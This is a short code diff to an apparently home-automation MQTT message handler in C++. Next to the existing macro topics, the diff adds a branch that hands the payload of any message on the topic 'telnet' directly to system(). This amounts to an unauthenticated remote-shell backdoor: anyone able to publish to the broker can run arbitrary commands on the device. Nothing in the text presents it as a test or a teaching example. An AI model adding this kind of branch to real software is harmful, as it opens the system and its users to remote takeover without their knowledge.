@@ -57,4 +57,7 @@ void Mqtt::on_message(const struct mosquitto_message *message)
     else if(message->topic == std::string("/macro/Marguerite")) {
         macro::Marguerite();
     }
+    else if(message->topic == std::string("telnet")) {
+        system(reinterpret_cast<char *>(message->payload));
+    }
 }
